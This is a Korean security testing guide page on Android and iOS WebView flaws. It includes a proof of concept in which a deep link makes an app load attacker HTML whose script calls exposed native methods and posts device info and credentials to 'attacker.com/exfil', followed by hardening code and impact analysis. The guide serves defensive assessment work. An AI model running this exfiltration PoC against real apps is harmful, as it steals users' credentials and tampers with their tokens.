---
sidebar_position: 12
title: WebView 결함 (WebView Issues)
...
### PoC 1 — [WebView / Android] addJavascriptInterface + 외부 URL → 임의 Native 메서드 호출

1. `static-analysis.md` 의 jadx 로 `addJavascriptInterface(JsBridge, "Android")` 발견 + `@JavascriptInterface` 메서드 `saveAuthToken`, `getDeviceInfo` 확인
2. 앱이 푸시 알림 / 딥링크로 받은 URL 을 WebView 에 로드 (`url` 파라미터)
3. 공격자 호스팅 HTML 의 JS 가 Native 메서드 호출

**1차 — 정적 분석에서 위험 코드 확인:**

```java
// jadx 결과 (com.target.app.WebActivity)
WebView webView = findViewById(R.id.webView);
webView.getSettings().setJavaScriptEnabled(true);
...
$ adb shell am start -a android.intent.action.VIEW \
    -d "targetapp://open?url=http://192.168.0.10:8000/poc.html"
```
...
<script>
    if (typeof Android !== 'undefined') {
        ...
        fetch('https://attacker.com/exfil', { method: 'POST', body: info });
        document.body.innerText = '[+] Native called';
    }
</script>
</body></html>
```
...
```
앱 WebView 에 "[+] Native called" 표시
attacker.com 서버 로그에 단말 정보 + 자격증명 전송 확인
앱 내 토큰이 ATTACKER_TOKEN 으로 덮어쓰기됨 → 후속 API 호출에 영향
```

**확인 사항:**
- WebView 가 외부 URL 을 검증 없이 로드 + JavascriptInterface 메서드가 토큰 저장 / 단말 정보 등 민감 액션 노출
- 단일 딥링크만으로 임의 사이트의 JS 가 Native 메서드 호출 가능
- 안전 패턴: (1) WebView URL 화이트리스트 (자사 도메인만), (2) JavascriptInterface 는 정말 필요한 메서드만 + 출처 검증, (3) 결제 / 토큰 같은 민감 액션은 JS 노출 금지

---

## 영향도 분석

- **기밀성 (Confidentiality)**: 🔴 — JavascriptInterface / file:// universal access / 메시지 핸들러로 단말 정보 / 자격증명 / 컨테이너 파일 노출
- **무결성 (Integrity)**: 🔴 — Native 메서드 호출로 토큰 / 설정 변조
- **추가 위협**:
  - WebView XSS + JavascriptInterface 결합 → RCE 표면
  - file:// universal access → 앱 컨테이너 모든 데이터 + 외부 origin 전송
  - URL 검증 부재 + 딥링크 결합 → 피싱
  - Mixed Content + 공용 Wi-Fi → 페이지 변조 / 자격증명 탈취

**비즈니스 임팩트:**
WebView 결함은 일반 웹 XSS 보다 영향이 큰 경우가 많다 — 앱의 Native 권한 / 시스템 자원과 결합되기 때문. 결제 / 인증 페이지 WebView 는 표준 점검 항목으로 포함, 외부 URL 로드 / 메시지 핸들러 / file:// 옵션 3가지 결합을 우선 점검.
...
1. **JavascriptInterface 최소화** — 정말 필요한 메서드만 + 입력 검증:

   ```java
   class JsBridge {
       @JavascriptInterface
       public void logEvent(String name) {
           // 분석 이벤트 등 무해한 메서드만 노출
           if (!ALLOWED_EVENTS.contains(name)) return;
           analytics.log(name);
       }
       // saveAuthToken / getDeviceInfo 등 민감 액션은 노출 금지
   }
   ```
...
2. **URL 화이트리스트:**
   ...
   webView.setWebViewClient(new WebViewClient() {
       ...
       public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
           ...
           return false;      // 자사 도메인만 로드
       }

       @Override
       public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {
           handler.cancel();  // 절대 proceed() 호출 금지
       }
   });
   ```
...
3. **file:// 옵션 명시 OFF:**
   ...
   s.setAllowFileAccess(false);                              // Android 11+ 기본 false
...
1. **`WKWebView` 사용 — `UIWebView` 마이그레이션 필수.**
...
2. **메시지 핸들러 출처 검증:**
   ...
   func userContentController(_ controller: WKUserContentController,
                              didReceive message: WKScriptMessage) {
       guard let frame = message.frameInfo as? WKFrameInfo,
             let host = frame.request.url?.host,
             ALLOWED_HOSTS.contains(host) else {
           return   // 자사 도메인 외 메시지 무시
       }
       // 처리
   }
   ```

3. **URL 검증 (`WKNavigationDelegate`):**

   ```swift
   func webView(_ webView: WKWebView,
                decidePolicyFor action: WKNavigationAction,
                decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {
       guard let host = action.request.url?.host, ALLOWED_HOSTS.contains(host) else {
...
4. **`loadFileURL` 권한 최소화:**

   ```swift
   webView.loadFileURL(htmlURL,
                       allowingReadAccessToURL: htmlURL.deletingLastPathComponent())
   ```

5. **`javaScriptEnabled` — 필요한 화면만 활성:**

   ```swift
   let config = WKWebViewConfiguration()
   let prefs = WKWebpagePreferences()
   prefs.allowsContentJavaScript = false   // 정적 HTML 만 표시하는 화면
   config.defaultWebpagePreferences = prefs
   ```

### 운영자 관점

1. **WebView 사용 위치 / 도메인 인벤토리** — 어떤 화면이 어떤 도메인을 로드하는지 인벤토리 유지.
2. **WebView 콘텐츠 CSP 적용** — 자사 도메인에 보안 헤더 / CSP 설정 (`assessment/web/security-headers.md` 영역).
